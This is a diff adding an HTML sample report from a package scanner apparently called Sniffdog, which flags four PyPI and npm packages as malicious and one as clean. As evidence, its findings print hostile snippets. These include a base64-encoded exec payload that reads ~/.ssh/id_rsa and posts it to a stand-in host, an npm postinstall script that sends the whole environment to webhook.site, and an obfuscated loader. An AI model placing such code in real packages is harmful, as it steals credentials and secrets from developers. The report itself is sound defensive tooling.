@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sniffdog sample report</title>
+<style>
+:root{--bg:#f6f7f9;--card:#fff;--fg:#14171c;--mute:#5d6673;--line:#e3e6eb;--crit:#b4231a;--high:#d9480f;--med:#b7791f;--low:#2b6cb0;--info:#718096;--ok:#2f855a;--code:#f0f2f5}
+@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--bg:#0f1115;--card:#171a21;--fg:#e6e9ee;--mute:#99a3b0;--line:#2a2f39;--code:#1f232c;--crit:#f05a50;--high:#ff8a4c;--med:#e3b341;--low:#63a4ff;--ok:#56c288}}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,sans-serif}
+main{max-width:1100px;margin:0 auto;padding:24px 16px}h1{font-size:22px;margin:0 0 4px}.sub{color:var(--mute);margin-bottom:18px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:18px;margin:16px 0;overflow-x:auto}
+.card header{display:flex;justify-content:space-between;gap:16px;align-items:center;margin-bottom:10px}h2{margin:0;font-size:18px}.ver{color:var(--mute);font-weight:400}
+.meta{color:var(--mute);font-size:12px}.score{display:flex;align-items:center;gap:10px}
+.gauge{--c:var(--ok);width:52px;height:52px;border-radius:50%;background:conic-gradient(var(--c) calc(var(--p)*1%),var(--line) 0);display:grid;place-items:center}
+.gauge span{background:var(--card);width:40px;height:40px;border-radius:50%;display:grid;place-items:center;font-weight:700}
+.verdict,.chip{text-transform:uppercase;font-weight:700;font-size:12px;padding:3px 8px;border-radius:6px;letter-spacing:.04em}
+.v-malicious{background:var(--crit);color:#fff}.v-suspicious{background:var(--high);color:#fff}.v-low-risk{background:var(--med);color:#111}.v-clean,.v-allowed{background:var(--ok);color:#fff}
+table{width:100%;border-collapse:collapse}th{text-align:left;color:var(--mute);font-weight:600;font-size:12px;border-bottom:1px solid var(--line);padding:6px}
+td{border-bottom:1px solid var(--line);padding:8px 6px;vertical-align:top}td.loc{font-family:ui-monospace,monospace;font-size:12px;color:var(--mute);word-break:break-all}
+.pill{font-size:11px;font-weight:700;padding:2px 7px;border-radius:10px;color:#fff;text-transform:uppercase}.critical{background:var(--crit)}.high{background:var(--high)}.medium{background:var(--med);color:#111}.low{background:var(--low)}.info{background:var(--info)}
+pre.snip{background:var(--code);padding:6px 8px;border-radius:6px;margin:6px 0 0;white-space:pre-wrap;word-break:break-all;font-size:12px}
+.ev,.att{color:var(--mute);font-size:12px;margin-top:4px}.it{font-size:11px;color:#fff;background:#805ad5;border-radius:4px;padding:1px 5px}.ok{color:var(--ok)}
+code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px}
+@media (max-width:640px){.card header{flex-direction:column;align-items:flex-start}td.loc{display:none}}
+</style></head><body><main>
+<h1>🐕 Sniffdog sample report</h1><div class="sub">Sniffdog 1.0.0 · 2026-11-20 23:49 UTC · <span class="chip v-malicious">4 malicious</span> <span class="chip v-clean">1 clean</span></div>
+
+<section class="card">
+  <header>
+    <div><h2>fastjsonx <span class="ver">0.1</span></h2>
+    <div class="meta">pypi · 1 files · 437 bytes · 18 ms</div></div>
+    <div class="score"><div class="gauge" style="--p:100"><span>100</span></div><div class="verdict v-malicious">malicious</div></div>
+  </header>
+  <table><thead><tr><th>Severity</th><th>Rule</th><th>Finding</th><th>Location</th></tr></thead><tbody><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>PY-EXFIL</code><div class=att>ATT&amp;CK T1041</div></td><td><b>Sensitive data sent over the network</b> <span class=it>install-time</span><div>credential/secret files flows into `urllib.request.urlopen` during package installation</div><pre class="snip">urllib.request.urlopen(&#x27;https://keys.example.invalid/&#x27;, data=k.encode())</pre><div class="ev">sources → sink: cred → <code>urllib.request.urlopen</code></div></td><td class="loc">setup.py&lt;layer1@L3&gt;&lt;layer2@L2&gt;:3</td></tr><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>PY-EXEC-OBFUSCATED</code><div class=att>ATT&amp;CK T1027</div></td><td><b>Executes obfuscated code</b> <span class=it>install-time</span><div>decoded/decompressed data is passed to `exec`</div><pre class="snip">exec(base64.b64decode(&#x27;aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVzdAprID0gb3Blbihvcy5wYXRoLmV4cGFuZHVzZXIoJ34vLnNzaC9pZF9yc2EnKSkucmVhZCgpCnVybGxpYi5yZXF1ZXN0LnVybG9wZW4o…</pre><div class="ev">decoded payload</div><pre class="snip">import os, urllib.request
+k = open(os.path.expanduser(&#x27;~/.ssh/id_rsa&#x27;)).read()
+urllib.request.urlopen(&#x27;https://keys.example.invalid/&#x27;, data=k.encode())
+</pre></td><td class="loc">setup.py&lt;layer1@L3&gt;:2</td></tr><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>PY-EXEC-OBFUSCATED</code><div class=att>ATT&amp;CK T1027</div></td><td><b>Executes obfuscated code</b> <span class=it>install-time</span><div>decoded/decompressed data is passed to `exec`</div><pre class="snip">exec(base64.b64decode(&#x27;aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5ekxDQjFjbXhzYVdJdWNtVnhkV1Z6ZEFwcklEMGdiM0JsYmlodmN5NXdZWFJvTG1WNGNHRnVa…</pre><div class="ev">decoded payload</div><pre class="snip">import base64
+exec(base64.b64decode(&#x27;aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVzdAprID0gb3Blbihvcy5wYXRoLmV4cGFuZHVzZXIoJ34vLnNzaC9pZF9yc2EnKSkucmVhZCgpCnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8va2V5cy5leGFtcGxlLmludmFsaWQvJywgZGF0YT1rLmVuY29kZSgpKQo=&#x27;))
+</pre></td><td class="loc">setup.py:3</td></tr><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>OBF-ENCODED-CODE</code><div class=att>ATT&amp;CK T1027</div></td><td><b>Encoded code embedded in source</b> <span class=it>install-time</span><div>a 328-char base64 string decodes to executable code</div><pre class="snip">exec(base64.b64decode(&#x27;aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5ekxDQjFjbXhzYVdJdWNtVnhkV1Z6ZEFw…</pre><div class="ev">decoded payload</div><pre class="snip">import base64
+exec(base64.b64decode(&#x27;aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVzdAprID0gb3Blbihvcy5wYXRoLmV4cGFuZHVzZXIoJ34vLnNzaC9pZF9yc2EnKSkucmVhZCgpCnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8va2V5cy5leGFtcGx</pre></td><td class="loc">setup.py:3</td></tr></tbody></table>
+</section>
+<section class="card">
+  <header>
+    <div><h2>@typescript_eslinter/eslint <span class="ver">8.57.1</span></h2>
+    <div class="meta">npm · 3 files · 355 bytes · 10 ms</div></div>
+    <div class="score"><div class="gauge" style="--p:99"><span>99</span></div><div class="verdict v-malicious">malicious</div></div>
+  </header>
+  <table><thead><tr><th>Severity</th><th>Rule</th><th>Finding</th><th>Location</th></tr></thead><tbody><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>JS-EXFIL</code><div class=att>ATT&amp;CK T1041</div></td><td><b>Sensitive data sent over the network</b> <span class=it>install-time</span><div>the entire environment, host fingerprint (hostname/user) flows into `axios.post` during npm install</div><pre class="snip">axios.post(&quot;https://webhook.site/00000000-0000-0000-0000-000000000000&quot;, { env: process.env, host: os.hostname() });</pre><div class="ev">sources → sink: env:all, sysinfo → <code>axios.post</code></div></td><td class="loc">install.js:3</td></tr><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>CORR-TYPOSQUAT-PAYLOAD</code><div class=att>ATT&amp;CK T1195.001</div></td><td><b>Typosquat with malicious behaviour</b><div>`@typescript_eslinter/eslint` resembles `eslint` (#104 most downloaded on npm) via unofficial scope @typescript_eslinter on a popular unscoped name, and it also contains: sensitive data sent over the network</div><pre class="snip">axios.post(&quot;https://webhook.site/00000000-0000-0000-0000-000000000000&quot;, { env: process.env, host: os.hostname() });</pre></td><td class="loc">install.js:3</td></tr><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>CORR-INSTALL-BEACON</code><div class=att>ATT&amp;CK T1041</div></td><td><b>Install-time beacon to attacker infrastructure</b> <span class=it>install-time</span><div>the entire environment, host fingerprint (hostname/user) flows into `axios.post` during npm install; the package also contains out-of-band interaction / request-capture service (webhook.site)</div><pre class="snip">axios.post(&quot;https://webhook.site/00000000-0000-0000-0000-000000000000&quot;, { env: process.env, host: os.hostname() });</pre></td><td class="loc">install.js:3</td></tr><tr class="sev-high"><td><span class="pill high">high</span></td><td><code>IOC-OAST</code><div class=att>ATT&amp;CK T1041</div></td><td><b>Out-of-band interaction / request-capture service</b> <span class=it>install-time</span><div>out-of-band interaction / request-capture service: webhook.site</div><pre class="snip">axios.post(&quot;https://webhook.site/00000000-0000-0000-0000-000000000000&quot;, { env: process.env, host: os.hostname() });</pre></td><td class="loc">install.js:3</td></tr><tr class="sev-medium"><td><span class="pill medium">medium</span></td><td><code>TYPOSQUAT</code><div class=att>ATT&amp;CK T1195.001</div></td><td><b>Possible typosquat</b><div>`@typescript_eslinter/eslint` resembles `eslint` (#104 most downloaded on npm) via unofficial scope @typescript_eslinter on a popular unscoped name</div></td><td class="loc">(package)</td></tr><tr class="sev-medium"><td><span class="pill medium">medium</span></td><td><code>NPM-INSTALL-SCRIPT</code></td><td><b>Runs code on `npm postinstall`</b> <span class=it>install-time</span><div>`postinstall`: node install.js</div><pre class="snip">node install.js</pre></td><td class="loc">package.json:6</td></tr></tbody></table>
+</section>
+<section class="card">
+  <header>
+    <div><h2>metrics-collector-lite <span class="ver">0.9</span></h2>
+    <div class="meta">pypi · 2 files · 617 bytes · 3 ms</div></div>
+    <div class="score"><div class="gauge" style="--p:76"><span>76</span></div><div class="verdict v-malicious">malicious</div></div>
+  </header>
+  <table><thead><tr><th>Severity</th><th>Rule</th><th>Finding</th><th>Location</th></tr></thead><tbody><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>PY-EXFIL</code><div class=att>ATT&amp;CK T1041</div></td><td><b>Sensitive data sent over the network</b><div>credential/secret files, the entire environment flows into `http.client.HTTPSConnection().request` (via _ship() line 15) at import time</div><pre class="snip">_ship(json.dumps(c.gather(), default=str))</pre><div class="ev">sources → sink: cred, env:all → <code>http.client.HTTPSConnection().request</code></div></td><td class="loc">mcl/__init__.py:19</td></tr></tbody></table>
+</section>
+<section class="card">
+  <header>
+    <div><h2>flatmap-streamx <span class="ver">0.1.1</span></h2>
+    <div class="meta">npm · 2 files · 525 bytes · 4 ms</div></div>
+    <div class="score"><div class="gauge" style="--p:85"><span>85</span></div><div class="verdict v-malicious">malicious</div></div>
+  </header>
+  <table><thead><tr><th>Severity</th><th>Rule</th><th>Finding</th><th>Location</th></tr></thead><tbody><tr class="sev-critical"><td><span class="pill critical">critical</span></td><td><code>JS-EXEC-OBFUSCATED</code><div class=att>ATT&amp;CK T1027</div></td><td><b>Decoded method invoked on decoded data</b><div>a method whose name is decoded at runtime is called with decoded data (e.g. Module._compile on a decrypted payload)</div><pre class="snip">!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,&quot;hex&quot;).toString()}var n=r(e(&quot;2e2f746573742f64617461&quot;)),o=t[e(n[3])][e(n[4])];if(!o)r…</pre></td><td class="loc">index.min.js:2</td></tr><tr class="sev-high"><td><span class="pill high">high</span></td><td><code>JS-OBFUSCATED-REQUIRE</code><div class=att>ATT&amp;CK T1027</div></td><td><b>Obfuscated require()</b><div>module name is decoded at runtime</div><pre class="snip">!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,&quot;hex&quot;).toString()}var n=r(e(&quot;2e2f746573742f64617461&quot;)),o=t[e(n[3])][e(n[4])];if(!o)r…</pre></td><td class="loc">index.min.js:2</td></tr><tr class="sev-medium"><td><span class="pill medium">medium</span></td><td><code>JS-MODULE-COMPILE</code><div class=att>ATT&amp;CK T1059.007</div></td><td><b>Compiles code through Node&#x27;s internal Module API</b><div>`new module.constructor()` / `_compile` evaluates a string as a module, bypassing eval detection</div><pre class="snip">!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,&quot;hex&quot;).toString()}var n=r(e(&quot;2e2f746573742f64617461&quot;)),o=t[e(n[3])][e(n[4])];if(!o)r…</pre></td><td class="loc">index.min.js:2</td></tr></tbody></table>
+</section>
+<section class="card">
+  <header>
+    <div><h2>requests <span class="ver">2.32.3</span></h2>
+    <div class="meta">pypi · 84 files · 476,710 bytes · 510 ms · sha256 55365417734eb182…</div></div>
+    <div class="score"><div class="gauge" style="--p:0"><span>0</span></div><div class="verdict v-clean">clean</div></div>
+  </header>
+  <p class="ok">No findings.</p>
+</section>
+</main>
+<script>document.querySelectorAll('.gauge').forEach(g=>{const p=+g.style.getPropertyValue('--p');g.style.setProperty('--c',p>=80?'var(--crit)':p>=40?'var(--high)':p>=10?'var(--med)':'var(--ok)')})</script>
+</body></html>
